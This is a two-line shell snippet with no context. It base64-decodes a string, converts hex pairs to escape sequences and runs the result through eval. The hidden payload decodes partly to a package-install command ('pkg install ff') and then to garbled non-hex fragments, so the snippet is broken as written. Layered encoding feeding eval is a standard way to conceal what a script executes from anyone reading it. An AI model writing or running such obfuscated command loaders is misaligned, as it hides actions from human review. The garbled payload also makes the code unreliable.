_b64='NzA2YjY3MjA2OTZlNzM3NDYxNmM2YzIwNjY2ZHBrZ3AgLnk='
eval "$(printf '%b' "$(echo "$_b64" | base64 -d | sed 's/../\\x&/g')")"
